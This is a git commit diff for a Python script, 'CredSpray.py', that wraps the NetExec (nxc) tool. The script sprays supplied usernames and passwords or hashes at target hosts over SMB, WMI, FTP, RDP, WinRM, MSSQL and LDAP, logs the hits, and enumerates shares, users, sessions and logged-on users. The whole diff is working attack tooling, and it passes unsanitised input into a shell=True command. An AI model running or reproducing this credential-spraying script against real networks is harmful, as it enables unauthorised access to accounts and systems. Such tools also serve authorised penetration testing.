55fb058de7b175f476b3ac41723582e48019cc34
tristanp299 <tristanp7313@gmail.com>
2024-08-10 04:52:14 +0000

    working credspray.py

--- scripts/CredSpray.py
+++ scripts/CredSpray.py
@@ -1,3 +1,4 @@
+#!/bin/env python3
 import argparse 
 from subprocess import run, PIPE, Popen, DEVNULL
 
@@ -8,10 +9,10 @@ class CredSpray:
         self.passwords = None
         self.passwords = None
         self.targets = None
-        self._parse_args
+        self._parse_args()
         self.protocols = ['smb','wmi','ftp','rdp','winrm','mssql','ldap']
         self.standard_flags = {'AD':'','local':'--local-auth'}
-        self.smb_flags = {'shares':'--shares','pass_pol':'--pass-pol','users':'--users','groups':'--groups','sessions','--sessions','loggedon':'--loggedon-users'}
+        self.smb_flags = {'shares':'--shares','pass_pol':'--pass-pol','users':'--users','groups':'--groups','sessions':'--sessions','loggedon':'--loggedon-users'}
         
     def _parse_args(self):
         parser = argparse.ArgumentParser()
@@ -20,19 +21,27 @@ class CredSpray:
         parser.add_argument('-H','--hash',help='hash')
         parser.add_argument('-t','--targets',help='target ips or list')
         args = parser.parse_args()
-        print('Arguments:'+' | '.join(args)
-        self.usernames = args.username
-        self.passwords = args.password
+        if not args:
+            print('ERROR: not args')
+            exit(1)
+        self.usernames = args.usernames
+        self.passwords = args.passwords
         self.targets = args.targets
 
     def nxc_spray(self):
+        targets = self.targets
         for proto in self.protocols:
-            for flag_name,flag in standard_flags.items():
-                command = f'nxc -u {self.usernames} -p [self.passwords} {flag} --continue-on-success | tee -a f"{proto}.{flag_name}.txt"'
+            for flag_name,flag in self.standard_flags.items():
+                command = f'nxc {proto} {targets} -u {self.usernames} -p {self.passwords} {flag} --continue-on-success | tee -a {proto}.{flag_name}.txt'
                 print(command)
                 run([command],shell=True,universal_newlines=True)
 
 def main():
-    CS = CredSpray()
-    CS.nxc_spray()
-    
+    try:
+        CS = CredSpray()
+        CS.nxc_spray()
+    except Exception as e:
+        print('ERROR:',e)
+        exit(1)
+if __name__ == '__main__':
+    main()
